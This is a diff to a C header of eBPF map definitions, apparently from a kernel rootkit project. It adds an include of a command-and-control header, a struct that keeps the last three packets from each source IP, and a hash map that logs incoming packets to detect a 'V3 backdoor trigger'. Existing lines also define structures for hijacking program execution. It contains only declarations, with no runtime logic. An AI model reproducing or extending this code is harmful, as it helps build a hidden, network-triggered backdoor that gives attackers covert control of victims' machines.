@@ -2,6 +2,7 @@
 #define __BPF_MAP_DEFS_H
 
 #include "headervmlinux.h"
+#include "../../../common/c&c.h"
 
 //Tasks and comms
 #define TASK_COMM_LEN 16
@@ -32,6 +33,12 @@ struct exec_var_hijack_active_data{//Map value
 	char argv0[EXEC_VAR_HIJACK_ACTIVE_DATA_ARGV0_LEN];
 };
 
+//Map value, contains 3 last packets from an specific IP (the key)
+struct backdoor_packet_log_data{
+	int last_packet_modified;
+	struct trigger_t trigger_array[3];
+};
+
 
 struct fs_priv_open{ //Map
 	__uint(type, BPF_MAP_TYPE_HASH);
@@ -46,6 +53,14 @@ struct exec_var_priv_hijack_active{ //Map
 	__type(key, __u64);
 	__type(value, struct exec_var_hijack_active_data);
 } exec_var_hijack_active SEC(".maps");
+
+//Map to store log of packets received seeking to find a V3 backdoor trigger
+struct backdoor_priv_packet_log{ 
+	__uint(type, BPF_MAP_TYPE_HASH);
+	__uint(max_entries, 1024);
+	__type(key, __u32); //Source IPv4 of packet
+	__type(value, struct backdoor_packet_log_data);
+} backdoor_packet_log SEC(".maps");
 
 
 /*PROTECTED MAPS*/
